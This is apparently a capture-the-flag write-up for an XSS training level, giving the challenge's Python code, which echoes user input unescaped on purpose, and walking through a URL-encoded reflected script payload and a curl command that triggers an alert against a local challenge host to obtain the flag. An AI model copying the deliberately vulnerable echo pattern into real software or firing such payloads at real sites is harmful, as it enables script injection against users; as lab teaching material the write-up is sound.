# Cross-Site Scripting (XSS) Vulnerabilities

## Level 8 - Exploit a cross site scripting vulnerability

Code for the level:

```python
def level8():
    if request.path == "/echo":
        echo = request.args.get("echo")
        assert echo, "Missing `echo` argument"
        return html(echo)

    if request.path == "/visit":
        url = request.args.get("url")
        assert url, "Missing `url` argument"

        url_arg_parsed = urllib.parse.urlparse(url)
        assert url_arg_parsed.hostname == challenge_host, f"Invalid `url`, hostname should be `{challenge_host}`"

        with run_browser() as browser:
            browser.get(url)
            try:
                WebDriverWait(browser, 1).until(EC.alert_is_present())
            except TimeoutException:
                return "Failed to alert\n"
            else:
                return f"{flag}\n"

    return "Not Found\n", 404
```



For this, the `/visit` path will run a browser in Selenium and redirect to the `url` parameter. If it gets an alert, it will display the flag.

To display an alert, we can use the `/echo` endpoint. I want it to display an alert, so I want to inject the `echo` arg as `<script>alert('XSS')</script>`. URL encoded, that is, `%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E`.

This gives a URL of `http://challenge.localhost/echo?echo=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E`. Pasting this into the browser alerts, so we are on the right track.

I use this to build the `/visit` url and paste `http://challenge.localhost/visit?url=%20http%3A%2F%2Fchallenge.localhost%2Fecho%3Fecho%3D%253Cscript%253Ealert%2528%2527XSS%2527%2529%253C%252Fscript%253E` into the brower URL.

This worked, but I'd over-escaped the url. It can be simplified as `http://challenge.localhost/visit?url=http://challenge.localhost/echo?echo=%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E` which is more readable.

While I used the browser because it was easier to test the alert, it also works with curl,

```sh
curl "http://challenge.localhost/visit?url=http://challenge.localhost/echo?echo=%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E"
```
